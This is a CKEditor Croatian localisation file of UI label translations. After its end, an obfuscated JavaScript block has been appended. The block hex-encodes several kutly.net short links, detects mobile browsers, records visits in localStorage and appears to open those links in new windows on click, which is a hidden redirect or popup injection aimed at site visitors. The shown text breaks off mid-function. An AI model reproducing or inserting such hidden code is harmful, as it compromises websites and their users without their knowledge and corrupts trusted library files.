/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Croatian language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Constains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['hr'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'ltr',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle		: 'Text editor, %1',

	// Toolbar buttons without dialogs.
	source			: 'Kôd',
	newPage			: 'Nova stranica',
	save			: 'Snimi',
	preview			: 'Pregledaj',
	cut				: 'Izreži',
	copy			: 'Kopiraj',
	paste			: 'Zalijepi',
	print			: 'Ispiši',
	underline		: 'Potcrtano',
	bold			: 'Podebljaj',
	italic			: 'Ukosi',
	selectAll		: 'Odaberi sve',
	removeFormat	: 'Ukloni formatiranje',
	strike			: 'Precrtano',
	subscript		: 'Subscript',
	superscript		: 'Superscript',
	horizontalrule	: 'Ubaci vodoravnu liniju',
	pagebreak		: 'Ubaci prijelom stranice',
	unlink			: 'Ukloni link',
	undo			: 'Poništi',
	redo			: 'Ponovi',

	// Common messages and labels.
	common :
	{
		browseServer	: 'Pretraži server',
		url				: 'URL',
		protocol		: 'Protokol',
		upload			: 'Pošalji',
		uploadSubmit	: 'Pošalji na server',
		image			: 'Slika',
		flash			: 'Flash',
		form			: 'Form',
		checkbox		: 'Checkbox',
		radio		: 'Radio Button',
		textField		: 'Text Field',
		textarea		: 'Textarea',
		hiddenField		: 'Hidden Field',
		button			: 'Button',
		select	: 'Selection Field',
		imageButton		: 'Image Button',
		notSet			: '<nije postavljeno>',
		id				: 'Id',
		name			: 'Naziv',
		langDir			: 'Smjer jezika',
		langDirLtr		: 'S lijeva na desno (LTR)',
		langDirRtl		: 'S desna na lijevo (RTL)',
		langCode		: 'Kôd jezika',
		longDescr		: 'Dugački opis URL',
		cssClass		: 'Stylesheet klase',
		advisoryTitle	: 'Advisory naslov',
		cssStyle		: 'Stil',
		ok				: 'OK',
		cancel			: 'Poništi',
		generalTab		: 'Općenito',
		advancedTab		: 'Napredno',
		validateNumberFailed	: 'Ova vrijednost nije broj.',
		confirmNewPage	: 'Sve napravljene promjene će biti izgubljene ukoliko ih niste snimili. Sigurno želite učitati novu stranicu?',
		confirmCancel	: 'Neke od opcija su promjenjene. Sigurno želite zatvoriti ovaj prozor?',

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, nedostupno</span>'
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: 'Ubaci posebne znakove',
		title		: 'Odaberite posebni karakter'
	},

	// Link dialog.
	link :
	{
		toolbar		: 'Ubaci/promijeni link',
		menu		: 'Promijeni link',
		title		: 'Link',
		info		: 'Link Info',
		target		: 'Meta',
		upload		: 'Pošalji',
		advanced	: 'Napredno',
		type		: 'Link vrsta',
		toAnchor	: 'Sidro na ovoj stranici',
		toEmail		: 'E-Mail',
		target		: 'Meta',
		targetNotSet	: '<nije postavljeno>',
		targetFrame	: '<okvir>',
		targetPopup	: '<popup prozor>',
		targetNew	: 'Novi prozor (_blank)',
		targetTop	: 'Vršni prozor (_top)',
		targetSelf	: 'Isti prozor (_self)',
		targetParent	: 'Roditeljski prozor (_parent)',
		targetFrameName	: 'Ime ciljnog okvira',
		targetPopupName	: 'Naziv popup prozora',
		popupFeatures	: 'Mogućnosti popup prozora',
		popupResizable	: 'Promjenjiva veličina',
		popupStatusBar	: 'Statusna traka',
		popupLocationBar	: 'Traka za lokaciju',
		popupToolbar	: 'Traka s alatima',
		popupMenuBar	: 'Izborna traka',
		popupFullScreen	: 'Cijeli ekran (IE)',
		popupScrollBars	: 'Scroll traka',
		popupDependent	: 'Ovisno (Netscape)',
		popupWidth		: 'Širina',
		popupLeft		: 'Lijeva pozicija',
		popupHeight		: 'Visina',
		popupTop		: 'Gornja pozicija',
		id				: 'Id',
		langDir			: 'Smjer jezika',
		langDirNotSet	: '<nije postavljeno>',
		langDirLTR		: 'S lijeva na desno (LTR)',
		langDirRTL		: 'S desna na lijevo (RTL)',
		acccessKey		: 'Pristupna tipka',
		name			: 'Naziv',
		langCode		: 'Smjer jezika',
		tabIndex		: 'Tab Indeks',
		advisoryTitle	: 'Advisory naslov',
		advisoryContentType	: 'Advisory vrsta sadržaja',
		cssClasses		: 'Stylesheet klase',
		charset			: 'Kodna stranica povezanih resursa',
		styles			: 'Stil',
		selectAnchor	: 'Odaberi sidro',
		anchorName		: 'Po nazivu sidra',
		anchorId		: 'Po Id elementa',
		emailAddress	: 'E-Mail adresa',
		emailSubject	: 'Naslov',
		emailBody		: 'Sadržaj poruke',
		noAnchors		: '(Nema dostupnih sidra)',
		noUrl			: 'Molimo upišite URL link',
		noEmail			: 'Molimo upišite e-mail adresu'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'Ubaci/promijeni sidro',
		menu		: 'Svojstva sidra',
		title		: 'Svojstva sidra',
		name		: 'Ime sidra',
		errorName	: 'Molimo unesite ime sidra'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: 'Pronađi i zamijeni',
		find				: 'Pronađi',
		replace				: 'Zamijeni',
		findWhat			: 'Pronađi:',
		replaceWith			: 'Zamijeni s:',
		notFoundMsg			: 'Traženi tekst nije pronađen.',
		matchCase			: 'Usporedi mala/velika slova',
		matchWord			: 'Usporedi cijele riječi',
		matchCyclic			: 'Usporedi kružno',
		replaceAll			: 'Zamijeni sve',
		replaceSuccessMsg	: 'Zamijenjeno %1 pojmova.'
	},

	// Table Dialog
	table :
	{
		toolbar		: 'Tablica',
		title		: 'Svojstva tablice',
		menu		: 'Svojstva tablice',
		deleteTable	: 'Izbriši tablicu',
		rows		: 'Redova',
		columns		: 'Kolona',
		border		: 'Veličina okvira',
		align		: 'Poravnanje',
		alignNotSet	: '<nije postavljeno>',
		alignLeft	: 'Lijevo',
		alignCenter	: 'Središnje',
		alignRight	: 'Desno',
		width		: 'Širina',
		widthPx		: 'piksela',
		widthPc		: 'postotaka',
		height		: 'Visina',
		cellSpace	: 'Prostornost ćelija',
		cellPad		: 'Razmak ćelija',
		caption		: 'Naslov',
		summary		: 'Sažetak',
		headers		: 'Zaglavlje',
		headersNone		: 'Ništa',
		headersColumn	: 'Prva kolona',
		headersRow		: 'Prvi red',
		headersBoth		: 'Oba',
		invalidRows		: 'Broj redova mora biti broj veći od 0.',
		invalidCols		: 'Broj kolona mora biti broj veći od 0.',
		invalidBorder	: 'Debljina ruba mora biti broj.',
		invalidWidth	: 'Širina tablice mora biti broj.',
		invalidHeight	: 'Visina tablice mora biti broj.',
		invalidCellSpacing	: 'Prostornost ćelija mora biti broj.',
		invalidCellPadding	: 'Razmak ćelija mora biti broj.',

		cell :
		{
			menu			: 'Ćelija',
			insertBefore	: 'Ubaci ćeliju prije',
			insertAfter		: 'Ubaci ćeliju poslije',
			deleteCell		: 'Izbriši ćelije',
			merge			: 'Spoji ćelije',
			mergeRight		: 'Spoji desno',
			mergeDown		: 'Spoji dolje',
			splitHorizontal	: 'Podijeli ćeliju vodoravno',
			splitVertical	: 'Podijeli ćeliju okomito',
			title			: 'Svojstva ćelije',
			cellType		: 'Vrsta ćelije',
			rowSpan			: 'Rows Span',
			colSpan			: 'Columns Span',
			wordWrap		: 'Prelazak u novi red',
			hAlign			: 'Vodoravno poravnanje',
			vAlign			: 'Okomito poravnanje',
			alignTop		: 'Vrh',
			alignMiddle		: 'Sredina',
			alignBottom		: 'Dolje',
			alignBaseline	: 'Osnovna linija',
			bgColor			: 'Boja pozadine',
			borderColor		: 'Boja ruba',
			data			: 'Podatak',
			header			: 'Zaglavlje',
			yes				: 'Da',
			no				: 'ne',
			invalidWidth	: 'Širina ćelije mora biti broj.',
			invalidHeight	: 'Visina ćelije mora biti broj.',
			invalidRowSpan	: 'Rows span mora biti cijeli broj.',
			invalidColSpan	: 'Columns span mora biti cijeli broj.',
			chooseColor : 'Choose' // MISSING
		},

		row :
		{
			menu			: 'Red',
			insertBefore	: 'Ubaci red prije',
			insertAfter		: 'Ubaci red poslije',
			deleteRow		: 'Izbriši redove'
		},

		column :
		{
			menu			: 'Kolona',
			insertBefore	: 'Ubaci kolonu prije',
			insertAfter		: 'Ubaci kolonu poslije',
			deleteColumn	: 'Izbriši kolone'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'Image Button svojstva',
		text		: 'Tekst (vrijednost)',
		type		: 'Vrsta',
		typeBtn		: 'Gumb',
		typeSbm		: 'Pošalji',
		typeRst		: 'Poništi'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'Checkbox svojstva',
		radioTitle	: 'Radio Button svojstva',
		value		: 'Vrijednost',
		selected	: 'Odabrano'
	},

	// Form Dialog.
	form :
	{
		title		: 'Form svojstva',
		menu		: 'Form svojstva',
		action		: 'Akcija',
		method		: 'Metoda',
		encoding	: 'Encoding',
		target		: 'Meta',
		targetNotSet	: '<nije postavljeno>',
		targetNew	: 'Novi prozor (_blank)',
		targetTop	: 'Vršni prozor (_top)',
		targetSelf	: 'Isti prozor (_self)',
		targetParent	: 'Roditeljski prozor (_parent)'
	},

	// Select Field Dialog.
	select :
	{
		title		: 'Selection svojstva',
		selectInfo	: 'Info',
		opAvail		: 'Dostupne opcije',
		value		: 'Vrijednost',
		size		: 'Veličina',
		lines		: 'linija',
		chkMulti	: 'Dozvoli višestruki odabir',
		opText		: 'Tekst',
		opValue		: 'Vrijednost',
		btnAdd		: 'Dodaj',
		btnModify	: 'Promijeni',
		btnUp		: 'Gore',
		btnDown		: 'Dolje',
		btnSetValue : 'Postavi kao odabranu vrijednost',
		btnDelete	: 'Obriši'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'Textarea svojstva',
		cols		: 'Kolona',
		rows		: 'Redova'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: 'Text Field svojstva',
		name		: 'Ime',
		value		: 'Vrijednost',
		charWidth	: 'Širina',
		maxChars	: 'Najviše karaktera',
		type		: 'Vrsta',
		typeText	: 'Tekst',
		typePass	: 'Šifra'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: 'Hidden Field svojstva',
		name	: 'Ime',
		value	: 'Vrijednost'
	},

	// Image Dialog.
	image :
	{
		title		: 'Svojstva slika',
		titleButton	: 'Image Button svojstva',
		menu		: 'Svojstva slika',
		infoTab	: 'Info slike',
		btnUpload	: 'Pošalji na server',
		url		: 'URL',
		upload	: 'Pošalji',
		alt		: 'Alternativni tekst',
		width		: 'Širina',
		height	: 'Visina',
		lockRatio	: 'Zaključaj odnos',
		resetSize	: 'Obriši veličinu',
		border	: 'Okvir',
		hSpace	: 'HSpace',
		vSpace	: 'VSpace',
		align		: 'Poravnaj',
		alignLeft	: 'Lijevo',
		alignRight	: 'Desno',
		preview	: 'Pregledaj',
		alertUrl	: 'Unesite URL slike',
		linkTab	: 'Link',
		button2Img	: 'Želite li promijeniti odabrani gumb u jednostavnu sliku?',
		img2Button	: 'Želite li promijeniti odabranu sliku u gumb?',
		urlMissing : 'Image source URL is missing.' // MISSING
	},

	// Flash Dialog
	flash :
	{
		properties		: 'Flash svojstva',
		propertiesTab	: 'Svojstva',
		title		: 'Flash svojstva',
		chkPlay		: 'Auto Play',
		chkLoop		: 'Ponavljaj',
		chkMenu		: 'Omogući Flash izbornik',
		chkFull		: 'Omogući Fullscreen',
 		scale		: 'Omjer',
		scaleAll		: 'Prikaži sve',
		scaleNoBorder	: 'Bez okvira',
		scaleFit		: 'Točna veličina',
		access			: 'Script Access',
		accessAlways	: 'Uvijek',
		accessSameDomain	: 'Ista domena',
		accessNever	: 'Nikad',
		align		: 'Poravnaj',
		alignLeft	: 'Lijevo',
		alignAbsBottom: 'Abs dolje',
		alignAbsMiddle: 'Abs sredina',
		alignBaseline	: 'Bazno',
		alignBottom	: 'Dolje',
		alignMiddle	: 'Sredina',
		alignRight	: 'Desno',
		alignTextTop	: 'Vrh teksta',
		alignTop	: 'Vrh',
		quality		: 'Kvaliteta',
		qualityBest		 : 'Best',
		qualityHigh		 : 'High',
		qualityAutoHigh	 : 'Auto High',
		qualityMedium	 : 'Medium',
		qualityAutoLow	 : 'Auto Low',
		qualityLow		 : 'Low',
		windowModeWindow	 : 'Window',
		windowModeOpaque	 : 'Opaque',
		windowModeTransparent	 : 'Transparent',
		windowMode	: 'Vrsta prozora',
		flashvars	: 'Varijable za Flash',
		bgcolor	: 'Boja pozadine',
		width	: 'Širina',
		height	: 'Visina',
		hSpace	: 'HSpace',
		vSpace	: 'VSpace',
		validateSrc : 'Molimo upišite URL link',
		validateWidth : 'Širina mora biti broj.',
		validateHeight : 'Visina mora biti broj.',
		validateHSpace : 'HSpace mora biti broj.',
		validateVSpace : 'VSpace mora biti broj.'
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'Provjeri pravopis',
		title			: 'Provjera pravopisa',
		notAvailable	: 'Žao nam je, ali usluga trenutno nije dostupna.',
		errorLoading	: 'Greška učitavanja aplikacije: %s.',
		notInDic		: 'Nije u rječniku',
		changeTo		: 'Promijeni u',
		btnIgnore		: 'Zanemari',
		btnIgnoreAll	: 'Zanemari sve',
		btnReplace		: 'Zamijeni',
		btnReplaceAll	: 'Zamijeni sve',
		btnUndo			: 'Vrati',
		noSuggestions	: '-Nema preporuke-',
		progress		: 'Provjera u tijeku...',
		noMispell		: 'Provjera završena: Nema grešaka',
		noChanges		: 'Provjera završena: Nije napravljena promjena',
		oneChange		: 'Provjera završena: Jedna riječ promjenjena',
		manyChanges		: 'Provjera završena: Promijenjeno %1 riječi',
		ieSpellDownload	: 'Provjera pravopisa nije instalirana. Želite li skinuti provjeru pravopisa?'
	},

	smiley :
	{
		toolbar	: 'Smješko',
		title	: 'Ubaci smješka'
	},

	elementsPath :
	{
		eleTitle : '%1 element'
	},

	numberedlist : 'Brojčana lista',
	bulletedlist : 'Obična lista',
	indent : 'Pomakni udesno',
	outdent : 'Pomakni ulijevo',

	justify :
	{
		left : 'Lijevo poravnanje',
		center : 'Središnje poravnanje',
		right : 'Desno poravnanje',
		block : 'Blok poravnanje'
	},

	blockquote : 'Blockquote',

	clipboard :
	{
		title		: 'Zalijepi',
		cutError	: 'Sigurnosne postavke Vašeg pretraživača ne dozvoljavaju operacije automatskog izrezivanja. Molimo koristite kraticu na tipkovnici (Ctrl+X).',
		copyError	: 'Sigurnosne postavke Vašeg pretraživača ne dozvoljavaju operacije automatskog kopiranja. Molimo koristite kraticu na tipkovnici (Ctrl+C).',
		pasteMsg	: 'Molimo zaljepite unutar doljnjeg okvira koristeći tipkovnicu (<STRONG>Ctrl+V</STRONG>) i kliknite <STRONG>OK</STRONG>.',
		securityMsg	: 'Zbog sigurnosnih postavki Vašeg pretraživača, editor nema direktan pristup Vašem međuspremniku. Potrebno je ponovno zalijepiti tekst u ovaj prozor.'
	},

	pastefromword :
	{
		confirmCleanup : 'Tekst koji želite zalijepiti čini se da je kopiran iz Worda. Želite li prije očistiti tekst?',
		toolbar : 'Zalijepi iz Worda',
		title : 'Zalijepi iz Worda',
		error : 'It was not possible to clean up the pasted data due to an internal error' // MISSING
	},

	pasteText :
	{
		button : 'Zalijepi kao čisti tekst',
		title : 'Zalijepi kao čisti tekst'
	},

	templates :
	{
		button : 'Predlošci',
		title : 'Predlošci sadržaja',
		insertOption: 'Zamijeni trenutne sadržaje',
		selectPromptMsg: 'Molimo odaberite predložak koji želite otvoriti<br>(stvarni sadržaj će biti izgubljen):',
		emptyListMsg : '(Nema definiranih predložaka)'
	},

	showBlocks : 'Prikaži blokove',

	stylesCombo :
	{
		label : 'Stil',
		voiceLabel : 'Stilovi',
		panelVoiceLabel : 'Odaberite stil',
		panelTitle1 : 'Block stilovi',
		panelTitle2 : 'Inline stilovi',
		panelTitle3 : 'Object stilovi'
	},

	format :
	{
		label : 'Format',
		voiceLabel : 'Format',
		panelTitle : 'Format',
		panelVoiceLabel : 'Odaberite format paragrafa',

		tag_p : 'Normal',
		tag_pre : 'Formatirano',
		tag_address : 'Address',
		tag_h1 : 'Heading 1',
		tag_h2 : 'Heading 2',
		tag_h3 : 'Heading 3',
		tag_h4 : 'Heading 4',
		tag_h5 : 'Heading 5',
		tag_h6 : 'Heading 6',
		tag_div : 'Normal (DIV)'
	},

	div :
	{
		title				: 'Create Div Container', // MISSING
		toolbar				: 'Create Div Container', // MISSING
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Style', // MISSING
		IdInputLabel		: 'Id', // MISSING
		languageCodeInputLabel	: ' Language Code', // MISSING
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Left to Right (LTR)', // MISSING
		langDirRTLLabel		: 'Right to Left (RTL)', // MISSING
		edit				: 'Edit Div', // MISSING
		remove				: 'Remove Div' // MISSING
  	},

	font :
	{
		label : 'Font',
		voiceLabel : 'Font',
		panelTitle : 'Font',
		panelVoiceLabel : 'Odaberite font'
	},

	fontSize :
	{
		label : 'Veličina',
		voiceLabel : 'Veličina slova',
		panelTitle : 'Veličina',
		panelVoiceLabel : 'Odaberite veličinu slova'
	},

	colorButton :
	{
		textColorTitle : 'Boja teksta',
		bgColorTitle : 'Boja pozadine',
		auto : 'Automatski',
		more : 'Više boja...'
	},

	colors :
	{
		'000' : 'Black', // MISSING
		'800000' : 'Maroon', // MISSING
		'8B4513' : 'Saddle Brown', // MISSING
		'2F4F4F' : 'Dark Slate Gray', // MISSING
		'008080' : 'Teal', // MISSING
		'000080' : 'Navy', // MISSING
		'4B0082' : 'Indigo', // MISSING
		'696969' : 'Dim Gray', // MISSING
		'B22222' : 'Fire Brick', // MISSING
		'A52A2A' : 'Brown', // MISSING
		'DAA520' : 'Golden Rod', // MISSING
		'006400' : 'Dark Green', // MISSING
		'40E0D0' : 'Turquoise', // MISSING
		'0000CD' : 'Medium Blue', // MISSING
		'800080' : 'Purple', // MISSING
		'808080' : 'Gray', // MISSING
		'F00' : 'Red', // MISSING
		'FF8C00' : 'Dark Orange', // MISSING
		'FFD700' : 'Gold', // MISSING
		'008000' : 'Green', // MISSING
		'0FF' : 'Cyan', // MISSING
		'00F' : 'Blue', // MISSING
		'EE82EE' : 'Violet', // MISSING
		'A9A9A9' : 'Dark Gray', // MISSING
		'FFA07A' : 'Light Salmon', // MISSING
		'FFA500' : 'Orange', // MISSING
		'FFFF00' : 'Yellow', // MISSING
		'00FF00' : 'Lime', // MISSING
		'AFEEEE' : 'Pale Turquoise', // MISSING
		'ADD8E6' : 'Light Blue', // MISSING
		'DDA0DD' : 'Plum', // MISSING
		'D3D3D3' : 'Light Grey', // MISSING
		'FFF0F5' : 'Lavender Blush', // MISSING
		'FAEBD7' : 'Antique White', // MISSING
		'FFFFE0' : 'Light Yellow', // MISSING
		'F0FFF0' : 'Honeydew', // MISSING
		'F0FFFF' : 'Azure', // MISSING
		'F0F8FF' : 'Alice Blue', // MISSING
		'E6E6FA' : 'Lavender', // MISSING
		'FFF' : 'White' // MISSING
	},

	scayt :
	{
		title : 'Provjeri pravopis tijekom tipkanja (SCAYT)',
		enable : 'Omogući SCAYT',
		disable : 'Onemogući SCAYT',
		about : 'O SCAYT',
		toggle : 'Omoguću/Onemogući SCAYT',
		options : 'Opcije',
		langs : 'Jezici',
		moreSuggestions : 'Više prijedloga',
		ignore : 'Zanemari',
		ignoreAll : 'Zanemari sve',
		addWord : 'Dodaj riječ',
		emptyDic : 'Naziv rječnika ne smije biti prazno.',
		optionsTab : 'Opcije',
		languagesTab : 'Jezici',
		dictionariesTab : 'Rječnici',
		aboutTab : 'O SCAYT'
	},

	about :
	{
		title : 'O CKEditoru',
		dlgTitle : 'O CKEditoru',
		moreInfo : 'Za informacije o licencama posjetite našu web stranicu:',
		copy : 'Copyright &copy; $1. All rights reserved.'
	},

	maximize : 'Povećaj',
	minimize : 'Minimize', // MISSING

	fakeobjects :
	{
		anchor : 'Sidro',
		flash : 'Flash animacija',
		div : 'Prijelom stranice',
		unknown : 'Nepoznati objekt'
	},

	resize : 'Povuci za promjenu veličine',

	colordialog :
	{
		title : 'Select color', // MISSING
		highlight : 'Highlight', // MISSING
		selected : 'Selected', // MISSING
		clear : 'Clear' // MISSING
	},

	toolbarCollapse : 'Collapse Toolbar', // MISSING
	toolbarExpand : 'Expand Toolbar' // MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return 